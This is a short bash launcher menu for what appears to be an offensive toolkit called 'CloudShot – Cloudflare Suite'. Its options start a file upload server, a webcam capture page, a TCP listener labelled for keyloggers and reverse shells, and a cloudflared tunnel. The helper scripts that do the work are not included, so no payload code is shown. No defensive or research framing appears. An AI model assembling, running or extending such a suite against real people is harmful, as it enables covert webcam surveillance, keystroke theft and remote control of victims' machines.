#!/bin/bash
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}====================================${NC}"
echo -e "${GREEN}   CloudShot – Cloudflare Suite      ${NC}"
echo -e "${GREEN}====================================${NC}"
echo "1) File Server (upload.php)"
echo "2) Webcam Capture (Flask + HTML)"
echo "3) TCP Listener (Keylogger/Reverse Shell)"
echo "4) Start TCP Tunnel only (cloudflared)"
echo "99) Exit"
read -p "Choose option: " opt

case $opt in
    1)
        bash start_fs.sh
        ;;
    2)
        bash start_webcam.sh
        ;;
    3)
        python3 listener.py
        ;;
    4)
        bash start_tcp.sh
        ;;
    99)
        exit 0
        ;;
    *)
        echo "Invalid option"
        ;;
esac
